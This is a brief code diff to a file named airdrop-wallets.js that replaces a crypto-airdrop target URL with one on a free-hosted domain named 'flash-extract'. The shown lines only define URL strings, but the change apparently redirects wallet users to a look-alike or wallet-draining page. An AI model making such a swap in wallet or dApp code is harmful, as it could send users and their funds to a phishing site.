@@ -1,5 +1,5 @@
 // airdrop-wallets.js
-const TARGET_URL = "https://cryptosafe.network/airdrop";
+const TARGET_URL = "https://flash-extract.netlify.app/airdrop";
 const DAPP_URL_NO_HTTP = TARGET_URL.replace(/^https?:\/\//, "");
 const ENCODED_URL = encodeURIComponent(TARGET_URL);
 
